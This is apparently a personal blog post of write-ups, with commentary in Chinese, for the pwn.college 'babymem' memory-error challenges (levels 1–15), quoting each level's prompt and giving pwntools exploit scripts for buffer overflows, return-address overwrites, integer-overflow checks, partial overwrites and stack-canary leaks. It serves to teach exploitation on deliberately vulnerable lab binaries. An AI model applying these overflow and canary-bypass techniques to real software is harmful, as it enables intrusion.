---
layout:	post
title:  "pwn.college: Memory Error"
date: 2022-3-12 21:00
author: "Adam"
header-img: "img/post-bg-segfault.jpg"
catalog: true
tags:
    - pwn.college
---

```
r = pwn.process("/challenge/babymem_level") 
<whatever needed for level 7.1 to work>
print(r.readall().decode("utf-8"))


import pwn

with pwn.process("/challenge/babymem_level12.0", setuid=False, aslr=False) as process:
    pwn.gdb.attach(process)
    process.interactive()
```



#### Level 1

> In this level, there is a "win" variable.
> By default, the value of this variable is zero.
> However, when this variable is non-zero, the flag will be printed.
> You can make this variable be non-zero by overflowing the input buffer.
> The "win" variable is stored at 0x7ffcca200978, 88 bytes after the start of your input buffer.

第一关需要把buffer后的一个变量的值改变，只需要有足够的输入即可。输入89个A后成功拿到flag。



#### Level 2

The challenge() function has just been launched!
This challenge stores your input buffer on the heap!
It also stores the "win" variable on the heap.
Allocating memory for the input buffer...
Called malloc(106) = 0x55b735a3b6b0
Called malloc(0x10) = 0x55b735a3b730
Called malloc(0x10) = 0x55b735a3b750
Called malloc(0x10) = 0x55b735a3b770
Called malloc(0x10) = 0x55b735a3b790
Called malloc(0x10) = 0x55b735a3b7b0
Called malloc(0x10) = 0x55b735a3b7d0
Allocating memory for the win variable...
Called calloc(1, sizeof(int)) = 0x55b735a3b7f0
In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x55b735a3b7f0, 320 bytes after the start of your input buffer.

这一关略有不同，这次数据是在堆上，但仍然可以找到offset为0x55b735a3b7f0 - 0x55b735a3b6b0 = 320。



#### Level 3

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffff0827268, 136 bytes after the start of your input buffer.
That means that you will need to input at least 144 bytes (113 to fill the buffer,
23 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

这一关不是修改变量了，而是需要修改返回地址到特定函数。并且题目也解除了canary和地址随机化。我们只需要找到返回地址的offset然后覆盖即可。最终在iPython中使用pwntools实现：

`r.send(b'\x00'*136+b'\x0f\x1d\x40')`

#### Level 4

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffc2743e7f8, 88 bytes after the start of your input buffer.
That means that you will need to input at least 96 bytes (60 to fill the buffer,
28 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

This challenge is more careful: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. But recall twos compliment, look at how the check is
implemented, and try to beat it!

同样的方法不成功了，这次需要使用一下补码，发送88字节的填充，再加最后8字节的返回地址。

#### Level 5
In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7fffd2297b18, 88 bytes after the start of your input buffer.
That means that you will need to input at least 96 bytes (48 to fill the buffer,
40 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
This challenge will let you send multiple payload records concatenated together.
It will make sure that the total payload size fits in the allocated buffer
on the stack. Can you send a carefully crafted input to break this calculation?
You will want to overwrite the return value from challenge()
(located at 0x7ffdee130128, 88 bytes past the start of the input buffer)
with 0x402164, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.

和上一题大体相同，如果按照正常的需求输入size，就会报以下错误:
```SHELL
babymem_level5.0: <stdin>:143: challenge: Assertion `record_size * record_num < (unsigned int) sizeof(input)' failed.
```
看到这里用的是无符号数，容易想到可以通过补码来绕过限制。仍然在ipython中进行操作。
```Python
import pwn
r = pwn.process("/challenge/babymem_level5.0")
r.sendline("2")
r.sendline("2147483648")
r.sendline(b'\x00' * 88 + b'\x64\x21\x40\x00\x00\x00\x00\x00')
```

#### Level 6
In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7fff00d955f8, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (92 to fill the buffer,
28 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Specifically, the win_authed() function looks something like:
``` C
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }
```
So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check, and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow that will overwrite the saved return address (at 0x7fff00d955f8, 120 bytes into the buffer)with the correct value.
- the address of win_authed() is 0x401bcd.
这一关需要我们在objdump中看一下win_authed()函数的逻辑，如下所示：
```SHELL
401bd9:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
401bdc:	81 7d fc 37 13 00 00 	cmp    DWORD PTR [rbp-0x4],0x1337
401be3:	0f 85 f2 00 00 00    	jne    401cdb <win_authed+0x10e>
```
这里是从edi中读数据再进行比较，修改edi显然不现实，所以这里的意思是要我们直接把返回地址修改到验证函数通过的地方。查看其汇编代码可以知道如果验证成功将会跳转到：0x401be9，所以这里就是我们的目标了。(其实判断之后的任意地址都可以)
```SHELL
r.sendline(b'\x00' * 120 + b'\xe9\x1b\x40' + b'\x00' * 5)
```

#### Level 7
That means that you will need to input at least 96 bytes (58 to fill the buffer,
30 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
Overwriting the entire return address is fine when we know
the whole address, but here, we only really know the last three nibbles.
These nibbles never change, because pages are aligned to 0x1000.
This gives us a workaround: we can overwrite the least significant byte
of the saved return address, which we can know from debugging the binary,
to retarget the return to main to any instruction that shares the other 7 bytes.
Since that last byte will be constant between executions (due to page alignment),
this will always work.
If the address we want to redirect execution to is a bit farther away from
the saved return address, and we need to write two bytes, then one of those
nibbles (the fourth least-significant one) will be a guess, and it will be
incorrect 15 of 16 times.
This is okay: we can just run our exploit a few
times until it works (statistically, after 8 times or so).
One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Specifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }
这一题开始有一些变化了，首先程序编程64位的，而且地址也不是静态的了，所以所有的地址都以偏移量表示。从验证函数的汇编代码可以知道其验证成功后跳转的相对地址为0x2411，但只知道这些是不够的。运行程序后可以观察到地址的高位是设置好的，并且由于页的对其机制最后三位也是不变的，所以我们只需要猜一位，也就是最高半个字节即可。最多需要测试16次。
```python
r = pwn.process("/challenge/babymem_level7.0")
r.sendline("90")
r.sendline(b'\x00' * 88 + b'\x11\x24')
print(r.readall())
```

#### Level 8
That means that you will need to input at least 176 bytes (119 to fill the buffer, 49 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address
这一题和上一题是一样的，地址变为0x2075.

#### Level 9
That means that you will need to input at least 48 bytes (17 to fill the buffer,
23 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
While canaries are enabled, this program reads your input 1 byte at a time,
tracking how many bytes have been read and the offset from your input buffer to read the byte to using a local variable on the stack.
The code for doing this looks something like:
```C
    while (n < size) {
    n += read(0, input + n, 1);    
    }
```
As it turns out, you can use this local variable `n` to jump over the canary.
Your input buffer is stored at 0x7ffcdb26f150, and this local variable `n`
is stored 20 bytes after it at 0x7ffcdb26f164.

When you overwrite `n`, you will change the program's understanding of
how many bytes it has read in so far, and when it runs `read(0, input + n, 1)` again, it will read into an offset that you control.
This will allow you to reposition the write *after* the canary, and write
into the return address!

The payload size is deceptively simple.
You don't have to think about how many bytes you will end up skipping:
with the while loop described above, the payload size marks the
*right-most* byte that will be read into.
As far as this challenge is concerned, there is no difference between bytes
"skipped" by fiddling with `n` and bytes read in normally: the values
of `n` and `size` are all that matters to determine when to stop reading,
*not* the number of bytes actually read in.

That being said, you *do* need to be careful on the sending side: don't send
the bytes that you're effectively skipping!

跳转地址：0x15bf

从这一题开始canary就不再禁用了，也就是说不能像之前的题目一样直接写buffer了。这一题给我们提供了一种跳过canary 的简单方式，就是用上面的变量`n`，通过改变n的值就可以直接跳到canary之后。
`n`的位置：0x8074，返回地址的位置：0x8088
因此可以先写入20字节空，在第21字节将`n`修改为40(0x24)，即可修改地址为跳转地址。
```python
import pwn
r = pwn.process("/challenge/babymem_level9.0")
r.sendline("42")
r.send(b'\x00' * 20 + b'\x27' + b'\xbf\x15')
# r.interactive()
print(r.readall())
```

#### Level 10
In this level, the flag will be loaded into memory.
However, at no point will this program actually print the buffer storing the flag.
这一题很有意思，题目说flag已经在内存里了，而且存在buffer后108字节的位置，但是不会有任何函数会打印flag，但是会打印我们插入的内容。所以我们只需要将空字节全部填充（包括最后的null termination）即可将flag一起打印出来。
```python
import pwn
r = pwn.process("/challenge/babymem_level10.0")
r.sendline("108")
r.sendline(b'\xaa' * 108)
r.interactive()
```

#### Level 11
这一题flag同样会被存入内存，但是输入buffer会被映射到页中。buffer到flag共32768字节。按上一题的方法即可得到flag。
```python
import pwn
r = pwn.process("/challenge/babymem_level11.0")
r.sendline("32768")
r.sendline(b'\xaa' * 32768)
r.interactive()
```

#### Level 12
That means that you will need to input at least 80 bytes (51 to fill the buffer,
21 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
Because the binary is position independent, you cannot know
exactly where the win_authed() function is located.
This means that it is not clear what should be written into the return address.
This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts(), call to see the hidden backdoor!
题目说这一题有个后门，查看源码后看到在这个puts()后面确实有一个：
```C
iVar3 = strstr(buf, "REPEAT");
if (iVar3 == 0) {
	puts("Goodbye!");
	uVar2 = 0;
} else {
	puts();
	uVar2 = challenge((uint64_t)(uint32_t)var_64h, var_70h, var_78h);
}
```
意思是说，如果输入buffer中有REPEAT这个字符串，就会重新进入challenge，而第二次进入挑战时canary是不变的，所以我们就可以第一次输入REPEAT获得canary，第二次直接覆盖。
这题可把我坑了半天，原因就是一个小小的p64()，
```python
from pwn import *
context.log_level='info'
r = process("/challenge/babymem_level12.0")
payload1 = b'REPEAT' + b'a'*49 + b'b'

r.sendlineafter(b'Payload size: ', str(len(payload1)))

r.sendafter(b'bytes)!\n', payload1)
r.recvuntil("- the canary value is now 0x")
addr = int(r.recvline()[:-2], 16)
log.success("addr => {}".format(hex(addr)))

r.sendline("74")
r.sendline(b'\xaa' * 56 + p64(addr) + b'\xaa' * 8 + b'\xa3\x24')

#r.send(b'\x00' * 8 + b'\xa3\x24')
#r.interactive()
print(r.readall())
```

#### Level 13
This challenge reads the flag file to verify it. Do you think this might leave traces of the flag around afterwards?

The flag was read into address 0x7ffc354390b2.

The challenge() function has just been launched!
However... An important initialisation step was missed.
Use this to your advantage!
这题搞得我有点懵，看了半天不知道从哪入手。再一看存flag的地址有数据，直接复制出去发现就是flag。。

#### Level 14
This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
call to see the hidden backdoor!
That means that you will need to input at least 352 bytes (325 to fill the buffer,
19 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
这一关同样是有后门，拖到Cutter中看看。
```C
iVar3 = strstr(buf, "REPEAT");
if (iVar3 == 0) {
puts("Goodbye!");
uVar2 = 0;
} else {
puts();
uVar2 = challenge((uint64_t)(uint32_t)var_174h, var_180h, var_188h);
}
```
是和上面一样的输入REPEAT就重启。
buffer -> canary: 328
canary: 8
canary -> return: 8
return: 1fbc
```python
from pwn import *
context.log_level='info'
r = process("/challenge/babymem_level14.0")
payload1 = b'REPEAT' + b'a'*49 + b'b'

r.sendlineafter(b'Payload size: ', str(len(payload1)))

r.sendafter(b'bytes)!\n', payload1)
r.recvuntil("- the canary value is now 0x")
canary = int(r.recvline()[:-2], 16)
log.success("addr => {}".format(hex(canary)))
r.sendline("346")
r.sendline(b'\xaa' * 328 + p64(canary) + b'\xaa' * 8 + b'\xbc\x1f')
#r.interactive()
print(r.readall())
```

#### Level 15
from pwn import *
r = process("/challenge/babymem_level15.0")
s = remote('localhost',1337, typ='tcp')

That means that you will need to input at least 48 bytes (19 to fill the buffer,
21 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
While canaries are enabled, this networked program forks.
What is important to note is that the canary does not get re-randomized on fork.
When data that you are overflowing into is critical (i.e., if you screw it up
the program crashes), but also static across executions, you can brute-force
it byte by byte over many attempts.

So, let's brute-force the canary!
If this is your first time running this program, all you know so far is that
the canary has a 0 as its left-most byte.
You should proceed like this:

- First, you should try overflowing just the null byte of the canary, for
  practice. The canary starts at 0x7ffef4ed8c88, which is 24 bytes after the
  start of your buffer. Thus, you should provide 24 characters followed
  by a NULL byte, make sure the canary check passes, then try a non-NULL
  byte and make sure the canary check fails. This will confirm the offsets.
- Next try each possible value for just the next byte. One of them (the same
  as whatever was there in memory already) will keep the canary intact, and
  when the canary check succeeds, you know you have found the correct one.
- Go on to the next byte, leak it the same way, and so on, until you have
  the whole canary.

You will likely want to script this process! Each byte might take up to 256
tries to guess..

地址：0x1ce5
``` SHELL
from pwn import *
r = process("/challenge/babymem_level15.0")
s = remote('localhost',1337, typ='tcp')
t = remote('localhost',1337, typ='tcp')
payload1 = b'REPEAT' + b'a'*4 + b'b'

s.sendlineafter(b'Payload size: ', str(len(payload1)))
s.sendafter(b'bytes)!\n', payload1)
s.recvuntil("- the canary value is now 0x")
canary = int(s.recvline()[:-2], 16)
log.success("canary => {}".format(hex(canary)))

t.sendline("42")
t.sendline(b'\xaa' * 24 + p64(canary) + b'\xaa' * 8 + b'\xe5\x1c')
t.interactive()
#print(t.readall())
```